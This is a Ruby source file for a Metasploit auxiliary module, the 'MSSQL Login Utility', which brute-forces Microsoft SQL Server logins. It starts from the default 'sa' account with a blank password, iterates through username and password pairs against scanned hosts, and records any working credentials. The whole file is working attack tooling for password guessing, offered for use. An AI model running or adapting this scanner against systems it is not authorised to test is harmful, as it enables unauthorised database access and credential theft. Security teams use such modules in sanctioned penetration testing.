##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'MSSQL Login Utility',
      'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
      'Author'         => 'MC',
      'References'     =>
        [
          [ 'CVE', '1999-0506'] # Weak password
        ],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)
    print_status("#{rhost}:#{rport} - MSSQL - Starting authentication scanner.")
    each_user_pass { |user, pass|
      do_login(user, pass, datastore['VERBOSE'])
    }
    # The service should already be reported at this point courtesy of
    # report_auth_info, but this is currently the only way to give it a
    # name.
    report_service({
      :host => rhost,
      :port => rport,
      :proto => 'tcp',
      :name => 'mssql'
    })
  end

  def do_login(user='sa', pass='', verbose=false)
    vprint_status("#{rhost}:#{rport} - MSSQL - Trying username:'#{user}' with password:'#{pass}'")
    begin
      success = mssql_login(user, pass)

      if (success)
        print_good("#{rhost}:#{rport} - MSSQL - successful login '#{user}' : '#{pass}'")
        report_auth_info(
          :host => rhost,
          :port => rport,
          :sname => 'mssql',
          :user => user.downcase,
          :pass => pass,
          :source_type => "user_supplied",
          :active => true
        )
        return :next_user
      else
        vprint_error("#{rhost}:#{rport} failed to login as '#{user}'")
        return
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} connection failed")
      return :abort
    end
  end
end
